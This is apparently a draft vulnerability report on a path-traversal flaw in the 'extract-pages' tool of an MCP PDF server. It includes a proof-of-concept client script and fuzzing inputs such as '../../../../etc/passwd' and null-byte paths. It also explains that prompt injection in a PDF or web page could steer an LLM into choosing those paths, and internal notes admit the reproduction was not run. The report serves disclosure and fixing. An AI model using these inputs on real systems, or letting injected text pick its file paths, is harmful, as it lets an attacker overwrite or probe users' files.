# Path traversal in `extract-pages`: `output_path` and `input_path` are used without any directory restriction

**Repository:** `hanweg/mcp-pdf-tools` · **Tool:** `extract-pages` · **Tested commit:** `388ba1f`
**Weakness:** CWE-22 Path Traversal

## Summary
`extract-pages` reads a PDF from `input_path` and writes the selected pages to `output_path`. Both values go straight to `PyPDF2.PdfReader()` and `open(..., 'wb')` with no check of where they point. A caller can pass `../` segments or an absolute path and the server creates or overwrites any file the process can write, and opens any file it can read. The server has no configured base directory, so nothing limits the reach to the folders the user meant to share.

## Details
`src/pdf_tools/server.py:185-208` at `388ba1f`:

```python
    elif name == "extract-pages":
        input_path = arguments.get("input_path")
        output_path = arguments.get("output_path")
        pages = arguments.get("pages", [])
        ...
        try:
            reader = PyPDF2.PdfReader(input_path)
            writer = PyPDF2.PdfWriter()
            for page_num in pages:
                if 1 <= page_num <= len(reader.pages):
                    writer.add_page(reader.pages[page_num - 1])
            ...
            with open(output_path, 'wb') as output_file:
                writer.write(output_file)
```

There is no `os.path.realpath` plus prefix check, no rejection of `..` segments or absolute paths, and no allow-list of directories anywhere in the server. Relative paths resolve against the server's working directory. `open(output_path, 'wb')` truncates an existing file, so the write side can destroy data, not only add files. On the read side, the error text differs between a missing file (`No such file or directory`) and an existing non-PDF file (`EOF marker not found`), which lets a caller probe for files outside any expected folder. Only valid PDFs have their pages copied out.

The other tools in this server (`merge-pdfs`, `merge-pdfs-ordered`, `search-pdfs`, `find-related-pdfs`) take paths the same way.

## Steps to reproduce
1. Prerequisites: Python 3.10+ and `uv`. No accounts or env vars. Create a marker file and an empty working folder first:

   ```bash
   mkdir -p /tmp/tofu-poc/root && echo marker > /tmp/tofu-poc/outside.txt
   ```
2. Install as the README describes (Linux/macOS form of the commands):

   ```bash
   git clone https://github.com/hanweg/mcp-pdf-tools.git
   cd mcp-pdf-tools && git checkout 388ba1f
   uv venv && uv pip install -e .
   .venv/bin/python -c "from PyPDF2 import PdfWriter; w = PdfWriter(); w.add_blank_page(width=72, height=72); w.write('/tmp/tofu-poc/root/in.pdf')"
   ```
3. Start the server with `/tmp/tofu-poc/root` as its working directory and call the tool with:

   ```json
   {"input_path": "in.pdf", "output_path": "../outside.txt", "pages": [1]}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="/path/to/mcp-pdf-tools/.venv/bin/pdf-tools",
           args=[],
           cwd="/tmp/tofu-poc/root",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("extract-pages", {
                   "input_path": "in.pdf",
                   "output_path": "../outside.txt",
                   "pages": [1],
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: `head -c 8 /tmp/tofu-poc/outside.txt` prints `%PDF-1.3` (or similar) instead of `marker`. The file sits outside `/tmp/tofu-poc/root`. With `"output_path": "../new.txt"` the tool creates `/tmp/tofu-poc/new.txt`. With `{"input_path": "../outside.txt", "output_path": "out.pdf", "pages": [1]}` on a fresh marker file, the reply is `Error extracting pages: EOF marker not found`, which shows the file outside the folder was opened and parsed.

## Expected behavior
File access is limited to directories the user configured (or at least the call is rejected when a path resolves outside them). `../outside.txt` returns an error and nothing outside `/tmp/tofu-poc/root` is opened, created or changed.

## Actual behavior
The tool reports `Successfully extracted 1 pages to ../outside.txt` and overwrites the marker. During fuzzing, a relative traversal path reached the parser outside the server's directory:

```
input:  {"input_path": "../../../../etc/passwd", "output_path": "output.pdf", "pages": [1]}
output: Error extracting pages: EOF marker not found
```

## Impact
In MCP the LLM chooses `input_path` and `output_path`, and prompt injection from untrusted content (for example text inside a PDF the user asks it to process, or a web page) can steer those values. An attacker who controls the arguments can overwrite any file the server user can write with PDF bytes (for example a config or script in the user's home), and can test whether arbitrary files exist. Reading file contents is limited to files that parse as PDF. The README calls the project work in progress, but users who add it to Claude Desktop get this reach with no visible boundary.

## Suggested fix
- Add an allow-list of directories (for example from command-line arguments or an env var such as `PDF_TOOLS_ALLOWED_DIRS`), as the reference filesystem MCP server does.
- In a shared helper, resolve every path with `os.path.realpath()` and reject it unless it equals an allowed root or starts with `root + os.sep`. Use the helper for `input_path` and `output_path` here and for the path arguments of the other four tools.
- Refuse to overwrite an existing `output_path` unless the caller passes an explicit `overwrite: true`.
- Return a generic "file not found or not a valid PDF" error so the error text does not reveal which files exist.

## Status on the default branch
Still present at `388ba1f` (2024-12-22). The default branch head is the tested commit.

## Prior reports
- #2 "Add MseeP.ai badge to README" (PR, open 2025-04-28): related only. A third-party badge PR whose body pastes an automated semgrep result, "Potentially unsafe file access", for `server.py` lines 164 and 168 (the `merge-pdfs` handler) "and 3 more medium severity issues" at unnamed locations. It does not name this tool, it is not a bug report, and nothing was changed.
- Documentation: README.md: "WORK IN PROGRESS - USE WITH CAUTION - Windows:" (a general caution only; the README does not say which paths the tools may touch, and there is no allowed-directory setting).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal (CWE-22). Fired for this tool: `check_path_traversal`, `check_introspection_path_traversal`, `check_introspection_sensitive_file_access`, `check_file_access`, `check_reflected_output`.
- Campaigns and executions: corpus-sbx 2560 exec / 181 ok (60 s); e2-0922 1024 exec / 96 ok (60 s).
- Evidence (verbatim, trimmed):
  - `{'input_path': '../../../../etc/passwd', 'output_path': 'output.pdf', 'pages': [1]}` -> `'Error extracting pages: EOF marker not found'`. Tracer: access outside dedicated directory, canonical `/etc/passwd`.
  - `{'input_path': '/etc/passwd\x00', 'output_path': 'output.pdf', 'pages': [1]}` -> `'Error extracting pages: embedded null byte'` (Python rejects the path before any syscall; no access happened).
  - `{'input_path': '..\\..\\..\\..\\windows\\win.ini', ...}` -> `[Errno 2] No such file or directory` (backslashes are literal on Linux; no escape).
- Hand-check hints: real, with a by-design caveat. The `../../../../etc/passwd` call shows a path outside the target directory reaching `PdfReader` (the "EOF marker" error proves the file was opened). The write side (`open(output_path, 'wb')` at `server.py:207`) is verified by code reading only; the fuzzer never got a successful write outside the scratch dir. The reproduction above was not executed; run it before filing, and check the exact `%PDF-` header PyPDF2 writes. The server has no root directory concept at all, so a maintainer may answer that arbitrary paths are intended; frame it as "add an allowed-directories boundary". The README warns "WORK IN PROGRESS - USE WITH CAUTION". Consider filing one issue covering all five tools instead of five separate ones.
</details>
